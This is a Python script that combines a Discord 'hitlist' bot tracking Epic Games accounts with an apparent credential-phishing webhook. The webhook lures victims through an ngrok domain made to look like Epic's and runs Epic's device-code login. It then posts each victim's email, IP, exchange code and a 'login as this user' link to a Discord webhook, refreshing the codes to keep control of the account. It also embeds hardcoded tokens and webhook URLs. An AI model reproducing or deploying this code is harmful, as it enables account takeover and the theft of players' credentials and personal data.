#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Combined Discord Bot and Epic Games Auth Webhook with Auto-Setup.
- On startup, installs required Python packages and downloads/configures ngrok.
- Runs the Discord Hitlist Bot.
- Runs the Epic Games Auth Webhook with ngrok.
- This script merges all logic into a single file for easy deployment.
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform

def run_setup():
    """
    Ensures all dependencies and ngrok are installed before starting the main application.
    """
    print("--- Starting initial setup ---")

    # 1. Install Python dependencies from requirements.txt
    try:
        print("1/3: Checking and installing Python dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("     Dependencies are up to date.")
    except Exception as e:
        print(f"     ERROR: Failed to install Python dependencies: {e}")
        sys.exit(1)

    # 2. Download and install ngrok
    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("2/3: Downloading and installing ngrok...")
            # Detect system architecture
            machine = platform.machine().lower()
            system = platform.system().lower()
            
            if system == "linux":
                if "aarch64" in machine or "arm64" in machine:
                    ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
                else: # Assume amd64
                    ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            else:
                 # Default to amd64 for other systems, can be expanded if needed
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            
            response = requests.get(ngrok_url, stream=True)
            response.raise_for_status()
            
            with open("ngrok.zip", "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref:
                zip_ref.extractall(".")
            os.remove("ngrok.zip")

            # Make the ngrok binary executable
            st = os.stat(ngrok_path)
            os.chmod(ngrok_path, st.st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}")
            sys.exit(1)
    else:
        print("2/3: ngrok is already installed.")

    # 3. Configure ngrok with authtoken
    authtoken = "32jkqnvr1UxwAzPDtdjBnPZiW3v_4n3y6xFuT45Vs4GPgXQ31" # Your ngrok token is now here.
    try:
        print("3/3: Configuring ngrok authtoken...")
        subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken])
        print("     ngrok authtoken configured.")
    except Exception as e:
        print(f"     ERROR: Failed to configure ngrok authtoken: {e}")
        sys.exit(1)

    print("--- Setup complete ---")

# Run the setup process before importing other modules
run_setup()


# --- MAIN APPLICATION IMPORTS ---
import json
import time
import logging
import re
import asyncio
import threading
import urllib.parse
from datetime import datetime
import http.server
import socketserver
import uuid
import traceback
from concurrent.futures import ThreadPoolExecutor

import discord
from discord.ext import commands, tasks
from discord.ui import View, Button
import aiohttp

# ==============================================================================
# --- DISCORD BOT HITLIST CODE ---
# ==============================================================================

# --- BOT CONFIGURATION ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN") # This MUST be set in Render's Environment Variables

# Bot version info
LAST_UPDATED = "2025-11-04 22:05:37"
BOT_USER = "gregergrgergeg"

# --- SERVER AND USER RESTRICTIONS ---
ALLOWED_SERVERS = [1427741533876125708, 1429638051482566708]
RESTRICTED_SERVER_ID = 1429638051482566708
ALLOWED_USER_ID = 851862667823415347

# --- RENDER PERSISTENT DISK CONFIG ---
DISK_PATH = "/etc/render/disk"
HITLIST_FILE_PATH = os.path.join(DISK_PATH, "hitlist.json")

# Epic API base URL for bot
API_BASE = "https://api.proswapper.xyz/external"
_HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")

# Headers for bot API requests
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
}

# List of proxies to use for bot API lookups
PROXIES = [
    "45.89.53.245:3128", "66.36.234.130:1339", "45.167.126.1:8080",
    "190.242.157.215:8080", "154.62.226.126:8888", "51.159.159.73:80",
    "176.126.103.194:44214", "185.191.236.162:3128", "157.180.121.252:35993",
    "157.180.121.252:16621", "157.180.121.252:55503", "157.180.121.252:53919",
    "175.118.246.102:3128", "64.92.82.61:8081", "132.145.75.68:5457",
    "157.180.121.252:35519", "77.110.114.116:8081"
]

# Random "hit" messages for bot
HIT_MESSAGES = [
    "{username} has been double pumped!",
    "{username} has been no scoped!",
    "{username} has been slammed!",
    "{username} got caught in the storm!",
    "{username} has been sent back to the lobby!",
    "{username} has been eliminated!",
]

# --- BOT SETUP ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("combined_runner")
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True # Required for on_guild_join
bot = commands.Bot(command_prefix='!', intents=intents)

# --- BOT GLOBAL VARIABLES & LOCKS ---
hitlist = {}
proxy_lock = threading.Lock()
current_proxy = None
proxy_last_checked = 0
proxy_check_interval = 60

# --- BOT PROXY MANAGEMENT ---
def test_proxy(proxy, timeout=3):
    proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    try:
        response = requests.get(f"{API_BASE}/name/epic", proxies=proxy_dict, timeout=timeout, headers=HEADERS)
        return response.status_code in [200, 404]
    except:
        return False

def find_working_proxy(force_check=False):
    global current_proxy, proxy_last_checked
    with proxy_lock:
        current_time = time.time()
        if not force_check and current_proxy and (current_time - proxy_last_checked) < proxy_check_interval:
            return current_proxy
        if current_proxy and test_proxy(current_proxy):
            logger.info(f"Current proxy still working: {current_proxy}")
            proxy_last_checked = current_time
            return current_proxy
        shuffled_proxies = PROXIES.copy()
        random.shuffle(shuffled_proxies)
        for proxy in shuffled_proxies:
            if test_proxy(proxy):
                logger.info(f"Found working proxy: {proxy}")
                current_proxy = proxy
                proxy_last_checked = current_time
                return proxy
        logger.warning("No working proxy found for bot. Trying direct connection.")
        current_proxy = None
        return None

def get_api_response(url, timeout=8.0):
    proxy = find_working_proxy()
    if proxy:
        proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            resp = requests.get(url, headers=HEADERS, proxies=proxy_dict, timeout=timeout)
            if resp.status_code in [200, 404]:
                return resp
        except requests.RequestException:
            logger.warning(f"Proxy {proxy} failed. Trying direct connection.")
    try:
        resp = requests.get(url, headers=HEADERS, timeout=timeout)
        return resp
    except requests.RequestException as e:
        logger.error(f"Direct connection error: {e}")
        return None

# --- BOT EPIC API FUNCTIONS ---
def epic_lookup_by_id(account_id):
    if not account_id or not _HEX32.match(account_id):
        return {"status": "INVALID", "message": "Invalid account ID format."}
    url = f"{API_BASE}/id/{account_id}"
    response = get_api_response(url)
    if response is None:
        return {"status": "ERROR", "message": "API request failed."}
    if response.status_code == 404:
        return {"status": "INACTIVE", "message": "Account not found or inactive (404)."}
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list) and len(data) > 0:
                return {"status": "ACTIVE", "data": data[0]}
            if isinstance(data, list) and len(data) == 0:
                return {"status": "INACTIVE", "message": "Account not found (API returned empty list)."}
            if isinstance(data, dict) and "displayName" in data:
                 return {"status": "ACTIVE", "data": data}
        except json.JSONDecodeError:
            return {"status": "ERROR", "message": "Failed to decode API response."}
    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}

def _normalize_account_object(obj):
    if not isinstance(obj, dict): return {}
    normalized = {}
    normalized['id'] = obj.get('id') or obj.get('accountId') or obj.get('account_id') or obj.get('epicId')
    normalized['displayName'] = obj.get('displayName') or obj.get('displayname') or obj.get('display_name') or obj.get('name')
    external = obj.get('externalAuths') or obj.get('external_auths') or obj.get('external') or obj.get('linkedAccounts')
    normalized['externalAuths'] = external if isinstance(external, dict) else {}
    normalized['_raw'] = obj
    return normalized

def epic_lookup_by_name(username):
    encoded_username = urllib.parse.quote(username)
    url = f"{API_BASE}/name/{encoded_username}"
    response = get_api_response(url)
    if response is None: return {"status": "ERROR", "message": "API request failed."}
    if response.status_code == 404: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list):
                if not data: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
                for user in data:
                    dn = (user.get('displayName') or user.get('displayname') or user.get('name') or "").lower()
                    if dn == username.lower(): return {"status": "ACTIVE", "data": _normalize_account_object(user)}
                return {"status": "ACTIVE", "data": _normalize_account_object(data[0])}
            elif isinstance(data, dict):
                return {"status": "ACTIVE", "data": _normalize_account_object(data)}
            else:
                return {"status": "INACTIVE", "message": f"User '{username}' not found."}
        except json.JSONDecodeError:
            return {"status": "ERROR", "message": "Failed to decode API response."}
    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}

# --- BOT DATA PERSISTENCE ---
def save_hitlist():
    try:
        os.makedirs(DISK_PATH, exist_ok=True)
        with open(HITLIST_FILE_PATH, "w") as f:
            json.dump(hitlist, f, indent=4)
    except IOError as e:
        logger.error(f"Could not write to persistent disk at {HITLIST_FILE_PATH}: {e}")

def load_hitlist():
    global hitlist
    if os.path.exists(HITLIST_FILE_PATH):
        try:
            with open(HITLIST_FILE_PATH, "r") as f:
                hitlist = json.load(f)
                logger.info(f"Loaded {len(hitlist)} accounts from persistent disk.")
        except (json.JSONDecodeError, IOError) as e:
            logger.error(f"Could not load hitlist from {HITLIST_FILE_PATH}: {e}")
            hitlist = {}
    else:
        logger.info("No hitlist file found on disk. Starting with an empty list.")
        hitlist = {}

# --- BOT EVENTS AND TASKS ---
@bot.event
async def on_ready():
    logger.info(f"Bot logged in as {bot.user.name}")
    logger.info(f"User: {BOT_USER}")
    logger.info(f"Last Updated: {LAST_UPDATED}")
    logger.info("---------------------------------")
    for guild in bot.guilds:
        if guild.id not in ALLOWED_SERVERS:
            logger.warning(f"Leaving unauthorized server: {guild.name} ({guild.id})")
            await guild.leave()
    load_hitlist()
    find_working_proxy(force_check=True)
    account_monitor.start()

@bot.event
async def on_guild_join(guild):
    if guild.id not in ALLOWED_SERVERS:
        logger.warning(f"Joined and leaving unauthorized server: {guild.name} ({guild.id})")
        await guild.leave()

@bot.before_invoke
async def check_permissions(ctx):
    if not ctx.guild: raise commands.CheckFailure("Commands cannot be used in DMs.")
    if ctx.guild.id not in ALLOWED_SERVERS:
        logger.warning(f"Command '{ctx.command}' blocked in unauthorized server: {ctx.guild.name} ({ctx.guild.id})")
        raise commands.CheckFailure("This bot is not authorized for this server.")
    if ctx.guild.id == RESTRICTED_SERVER_ID and ctx.author.id != ALLOWED_USER_ID:
        logger.warning(f"User {ctx.author} ({ctx.author.id}) blocked from using '{ctx.command}' in restricted server.")
        raise commands.CheckFailure("You do not have permission to use this command.")
    return True

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        pass
    else:
        logger.error(f"An error occurred with command '{ctx.command}': {error}")

@tasks.loop(minutes=1)
async def account_monitor():
    if not hitlist: return
    logger.info(f"Running account monitor for {len(hitlist)} accounts...")
    accounts_to_check = list(hitlist.keys())
    for account_id in accounts_to_check:
        account_data = hitlist.get(account_id)
        if not account_data: continue
        username, channel_id, user_id = account_data['username'], account_data.get('channel_id'), account_data.get('user_id')
        logger.info(f"Checking {username} ({account_id})")
        result = await bot.loop.run_in_executor(None, epic_lookup_by_id, account_id)
        if result["status"] == "INACTIVE":
            logger.info(f"Account {username} ({account_id}) is now INACTIVE. Reason: {result.get('message')}")
            message_title = random.choice(HIT_MESSAGES).format(username=username)
            embed = discord.Embed(title=message_title, color=discord.Color.red())
            embed.add_field(name="Account ID", value=account_id, inline=False)
            embed.set_footer(text=f"Time of Inactivity: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
            if channel_id:
                channel = bot.get_channel(channel_id)
                if channel:
                    try: await channel.send(embed=embed)
                    except discord.Forbidden: logger.error(f"Bot does not have permission to send messages in channel {channel_id}.")
                    except Exception as e: logger.error(f"Failed to send message to channel {channel_id}: {e}")
            if user_id:
                try:
                    user = await bot.fetch_user(user_id)
                    if user: await user.send(embed=embed)
                except Exception as e: logger.error(f"Failed to DM user {user_id}: {e}")
            del hitlist[account_id]
            save_hitlist()
            logger.info(f"Removed {username} from the hitlist.")
        await asyncio.sleep(2)

# --- BOT UI COMPONENTS ---
class ConfirmationView(View):
    def __init__(self, account_data, original_author):
        super().__init__(timeout=60)
        self.account_data = account_data
        self.original_author = original_author
        self.message = None

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.original_author.id:
            await interaction.response.send_message("You cannot interact with this.", ephemeral=True)
            return False
        return True

    async def disable_buttons(self):
        for item in self.children: item.disabled = True
        if self.message: await self.message.edit(view=self)

    @discord.ui.button(label="Yes", style=discord.ButtonStyle.success)
    async def yes_button(self, interaction: discord.Interaction, button: Button):
        await self.disable_buttons()
        display_name = self.account_data.get("displayName", "N/A")
        account_id = self.account_data.get("id", "N/A")
        external_auths = self.account_data.get("externalAuths", {})
        format_str = f"my ID: {account_id}\nmy epic: {display_name}\n"
        if "xbox" in external_auths and isinstance(external_auths.get("xbox"), dict):
            format_str += f"my xbox: {external_auths['xbox'].get('externalDisplayName', 'N/A')}\n"
        if "psn" in external_auths and isinstance(external_auths.get("psn"), dict):
            format_str += f"my psn: {external_auths['psn'].get('externalDisplayName', 'N/A')}\n"
        await interaction.response.send_message(f"```{format_str.strip()}```")

    @discord.ui.button(label="No", style=discord.ButtonStyle.danger)
    async def no_button(self, interaction: discord.Interaction, button: Button):
        await self.disable_buttons()
        await interaction.response.send_message("Format request cancelled.", ephemeral=True)

    async def on_timeout(self):
        await self.disable_buttons()

# --- BOT COMMANDS ---
@bot.command(name='user')
async def user_lookup(ctx, *, identifier: str):
    msg = await ctx.send(f"🔍 Searching for `{identifier}`...")
    result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)

    if result["status"] == "ACTIVE":
        account_data = result["data"]
        if isinstance(account_data, dict) and ('displayName' not in account_data and '_raw' not in account_data):
            account_data = _normalize_account_object(account_data)
        elif isinstance(account_data, list) and account_data:
            account_data = _normalize_account_object(account_data[0])

        display_name = account_data.get("displayName") or (account_data.get('_raw') or {}).get('displayName') or "N/A"
        account_id = account_data.get("id") or (account_data.get('_raw') or {}).get('id') or "N/A"
        embed = discord.Embed(title=f"✅ Account Found: {display_name}", color=discord.Color.green())
        embed.add_field(name="Status", value="🟢 **ACTIVE**", inline=False)
        embed.add_field(name="Account ID", value=account_id, inline=False)
        external_auths = account_data.get("externalAuths") or (account_data.get('_raw') or {}).get('externalAuths') or {}
        linked_accounts_text = ""
        if external_auths:
            for platform, details in external_auths.items():
                if isinstance(details, dict):
                    name = details.get('externalDisplayName') or 'N/A'
                    linked_accounts_text += f"**{platform.capitalize()}:** {name}\n"
        embed.add_field(name="🔗 Linked Accounts", value=linked_accounts_text or "No external accounts linked.", inline=False)
        await msg.edit(content=None, embed=embed)

        view = ConfirmationView({"displayName": display_name, "id": account_id, "externalAuths": external_auths}, ctx.author)
        view.message = await ctx.send("Do you want to build a format for this user?", view=view)
    else:
        embed = discord.Embed(title="❌ Account Not Found" if result["status"] == "INACTIVE" else "⚠️ Lookup Failed",
                              description=result.get("message", "An unknown error occurred."),
                              color=discord.Color.red() if result["status"] == "INACTIVE" else discord.Color.orange())
        if result["status"] == "INACTIVE":
             embed.add_field(name="Identifier Searched", value=identifier, inline=False)
        await msg.edit(content=None, embed=embed)

@bot.command(name='save')
async def save_account(ctx, *, identifier: str):
    if not identifier: await ctx.send("❌ **Error:** You must provide a username or account ID."); return
    msg = await ctx.send(f"🔍 Verifying account `{identifier}`...")
    result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)

    if result["status"] == "ACTIVE":
        account_data = _normalize_account_object(result["data"])
        account_id = account_data.get("id")
        username = account_data.get("displayName")
        if not account_id or not username:
            await msg.edit(content="❌ **Failed:** Could not retrieve essential account details."); return
        if account_id in hitlist:
            await msg.edit(content=f"⚠️ **Notice:** `{username}` is already on the hitlist."); return
        hitlist[account_id] = {"username": username, "channel_id": ctx.channel.id, "user_id": ctx.author.id}
        save_hitlist()
        await msg.edit(content=f"✅ **Success!** `{username}` has been added to the hit list.")
    else:
        await msg.edit(content=f"❌ **Failed:** Could not verify `{identifier}`. Reason: {result.get('message')}")

@bot.command(name='unsave')
async def unsave_account(ctx, *, identifier: str):
    if not identifier: await ctx.send("❌ **Error:** You must provide a username or account ID."); return
    account_id_to_remove, username_to_remove = None, None
    if _HEX32.match(identifier):
        if identifier in hitlist:
            account_id_to_remove = identifier
            username_to_remove = hitlist[identifier]['username']
    else:
        for acc_id, data in hitlist.items():
            if data['username'].lower() == identifier.lower():
                account_id_to_remove, username_to_remove = acc_id, data['username']
                break
    if account_id_to_remove:
        del hitlist[account_id_to_remove]
        save_hitlist()
        await ctx.send(f"🗑️ **Success!** `{username_to_remove}` has been removed from the hit list.")
    else:
        await ctx.send(f"❌ **Error:** `{identifier}` was not found on the hit list.")

@bot.command(name='hitlist')
async def show_hitlist(ctx):
    if not hitlist: await ctx.send("The hit list is currently empty."); return
    embed = discord.Embed(title="Current Hit List", color=discord.Color.blue())
    description = ""
    for i, (account_id, data) in enumerate(hitlist.items(), 1):
        channel_mention = f"<#{data.get('channel_id')}>" if data.get('channel_id') else "N/A"
        user_mention = f"<@{data.get('user_id')}>" if data.get('user_id') else "N/A"
        description += f"**{i}. {data['username']}**\n   - ID: `{account_id}`\n   - Channel: {channel_mention}\n   - Saved by: {user_mention}\n"
    embed.description = description
    embed.set_footer(text=f"Monitoring {len(hitlist)} accounts.")
    await ctx.send(embed=embed)


# ==============================================================================
# --- EPIC AUTH WEBHOOK CODE ---
# ==============================================================================

# --- WEBHOOK Configuration ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1435137532982460496/yQDcR1du8DVdOMvNdPyc2ev8JLt7CSYGT2vhhgWkDpjuN4MHcQ_qGLt6pjxhoDj6hKDS"
DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1435149537512783965/HdBp1X49693qa-T7BOnNyoH8rhZM9pgwPo3vsCcSZsXWjVVskJ2yIsXxrXha4gM8gFJ4"
NGROK_DOMAIN = "cancel-request.epicgames.ngrok.dev"
REFRESH_INTERVAL = 120

# --- WEBHOOK Global State ---
ngrok_url = None
ngrok_ready = threading.Event()
permanent_link = None
permanent_link_id = None
verification_uses = 0
active_sessions = {}
session_lock = threading.Lock()

# --- WEBHOOK Epic Games Authentication ---
async def create_epic_auth_session():
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    async with aiohttp.ClientSession() as sess:
        async with sess.post(
            "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
            headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "client_credentials"}
        ) as r:
            token_data = await r.json() if r.status == 200 else {}
        async with sess.post(
            "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization",
            headers={"Authorization": f"bearer {token_data.get('access_token')}", "Content-Type": "application/x-www-form-urlencoded"}
        ) as r:
            dev_auth = await r.json() if r.status == 200 else {}
    return {
        'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth.get('user_code')}",
        'device_code': dev_auth.get('device_code'),
        'interval': dev_auth.get('interval', 5),
        'expires_in': dev_auth.get('expires_in', 600)
    }

async def refresh_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
                                headers={"Authorization": f"bearer {access_token}"}) as r:
                return (await r.json()).get('code') if r.status == 200 else None
    except Exception as e:
        logger.error(f"❌ Error refreshing exchange code: {e}"); return None

async def auto_refresh_session(session_id, access_token, account_info, user_ip):
    display_name = account_info.get('displayName', 'Unknown')
    refresh_count = 0
    logger.info(f"[{session_id}] 🔄 Started auto-refresh for {display_name}")
    while True:
        await asyncio.sleep(REFRESH_INTERVAL)
        new_exchange_code = await refresh_exchange_code(access_token)
        if new_exchange_code:
            refresh_count += 1
            with session_lock:
                if session_id in active_sessions:
                    active_sessions[session_id]['exchange_code'] = new_exchange_code
                    active_sessions[session_id]['last_refresh'] = time.time()
                    active_sessions[session_id]['refresh_count'] = refresh_count
                else:
                    logger.info(f"[{session_id}] ⏹️ Session removed, stopping refresh"); break
            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{refresh_count})")
            await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
        else:
            logger.error(f"[{session_id}] ❌ Failed to refresh exchange code, removing session.")
            with session_lock:
                if session_id in active_sessions: del active_sessions[session_id]
            break

async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip):
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    logger.info(f"[{verify_id}] 👁️  Monitoring Epic auth...")
    try:
        async with aiohttp.ClientSession() as sess:
            deadline = time.time() + expires_in
            while time.time() < deadline:
                await asyncio.sleep(interval)
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
                                     headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"},
                                     data={"grant_type": "device_code", "device_code": device_code}) as r:
                    if r.status == 200:
                        token_resp = await r.json()
                        if "access_token" in token_resp:
                            logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
                            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange",
                                                headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2:
                                exchange_data = await r2.json()
                            async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}",
                                                headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3:
                                account_info = await r3.json()
                            session_id = str(uuid.uuid4())[:8]
                            with session_lock:
                                active_sessions[session_id] = {'access_token': token_resp['access_token'], 'exchange_code': exchange_data['code'], 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0}
                            await send_login_success(session_id, account_info, exchange_data['code'], user_ip)
                            asyncio.create_task(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip))
                            return
    except Exception as e:
        logger.error(f"[{verify_id}] ❌ Monitoring error: {e}\n{traceback.format_exc()}")

async def send_webhook_message(webhook_url, payload, log_prefix):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=payload) as resp:
                if resp.status in [200, 204]:
                    logger.info(f"✅ {log_prefix} webhook sent successfully")
                else:
                    logger.error(f"❌ {log_prefix} webhook failed: {resp.status}")
    except Exception as e:
        logger.error(f"❌ {log_prefix} webhook error: {e}")

async def send_login_success(session_id, account_info, exchange_code, user_ip):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "✅ User Logged In Successfully", "description": f"**{display_name}** has completed verification!", "color": 3066993, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Link uses: {verification_uses} | Auto-refresh: ON"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_WEBHOOK_URL, {"embeds": [embed]}, f"Initial login for {display_name}")

async def send_refresh_update(session_id, account_info, exchange_code, user_ip, refresh_count):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "🔄 Exchange Code Refreshed", "description": f"**{display_name}** - New exchange code generated!", "color": 3447003, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Refresh #{refresh_count}"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_UPDATES_WEBHOOK_URL, {"embeds": [embed]}, f"Refresh #{refresh_count} for {display_name}")

def send_webhook_startup_message(link):
    embed = {"title": "🚀 Epic Auth System Started", "description": f"System is online and ready!\n\n🔗 **Permanent Verification Link:**\n{link}", "color": 3447003, "fields": [{"name": "Status", "value": "✅ Online", "inline": True}, {"name": "Link Expiry", "value": "Never", "inline": True}], "footer": {"text": "Webhook system online"}, "timestamp": datetime.utcnow().isoformat()}
    requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})

# --- WEBHOOK Web Server ---
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        if self.path.startswith('/verify/'):
            verify_id = self.path.split('/')[-1]
            if verify_id != permanent_link_id:
                self.send_error(404, "Link not found"); return
            verification_uses += 1
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            logger.info(f"\n[{verify_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                epic_session = loop.run_until_complete(create_epic_auth_session())
                def run_monitor():
                    monitor_loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(monitor_loop)
                    monitor_loop.run_until_complete(monitor_epic_auth(verify_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip))
                    monitor_loop.close()
                threading.Thread(target=run_monitor, daemon=True).start()
                self.send_response(302)
                self.send_header('Location', epic_session['activation_url'])
                self.end_headers()
            except Exception as e:
                logger.error(f"[{verify_id}] ❌ Error: {e}\n{traceback.format_exc()}"); self.send_error(500)
            finally:
                loop.close()
        else: self.send_error(404)
    def log_message(self, format, *args): pass

class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

def setup_ngrok_tunnel(port):
    global ngrok_url, permanent_link, permanent_link_id
    
    ngrok_executable = os.path.join(os.getcwd(), "ngrok")

    try:
        logger.info("🌐 Starting ngrok...")
        # Use the locally downloaded ngrok executable
        process = subprocess.Popen([ngrok_executable, 'http', f'--domain={NGROK_DOMAIN}', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        for _ in range(60):
            time.sleep(1)
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=2)
                data = response.json()
                for tunnel in data.get('tunnels', []):
                    if tunnel.get('public_url', '').startswith('https://'):
                        ngrok_url = tunnel['public_url']
                        permanent_link_id = str(uuid.uuid4())[:12]
                        permanent_link = f"{ngrok_url}/verify/{permanent_link_id}"
                        logger.info(f"✅ Ngrok live: {ngrok_url}")
                        logger.info(f"🔗 Permanent link: {permanent_link}")
                        ngrok_ready.set()
                        send_webhook_startup_message(permanent_link)
                        return
            except requests.ConnectionError: continue
        logger.error("❌ Ngrok failed to start"); os._exit(1)
    except Exception as e:
        logger.error(f"❌ Ngrok error: {e}"); os._exit(1)

def run_web_server(port):
    server = ThreadingHTTPServer(("", port), RequestHandler)
    logger.info(f"🚀 Web server starting on port {port}")
    server.serve_forever()

# --- MAIN EXECUTION BLOCK ---
def start_app():
    logger.info("\n" + "=" * 60)
    logger.info("🚀 COMBINED BOT AND WEBHOOK SYSTEM STARTING")
    logger.info("=" * 60 + "\n")

    # Start Web Server and Ngrok in background threads
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()

    # Wait for ngrok to be ready
    if not ngrok_ready.wait(timeout=65):
        logger.critical("❌ Ngrok failed to initialize. The webhook will not be available. Exiting.")
        return

    logger.info("\n" + "=" * 60)
    logger.info("✅ WEBHOOK READY - Permanent link sent to Discord")
    logger.info(f"   Link: {permanent_link}")
    logger.info("=" * 60 + "\n")

    # Start the Discord Bot in the main thread
    if not BOT_TOKEN:
        logger.critical("ERROR: Bot token not found. Make sure the DISCORD_BOT_TOKEN environment variable is set in Render.")
        sys.exit(1) # Exit with status 1 if the token is missing

    logger.info("Starting Discord bot...")
    try:
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        logger.critical("ERROR: Invalid bot token provided. Please check your DISCORD_BOT_TOKEN environment variable.")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"ERROR: Failed to start the bot: {e}")
        sys.exit(1)

if __name__ == "__main__":
    start_app()
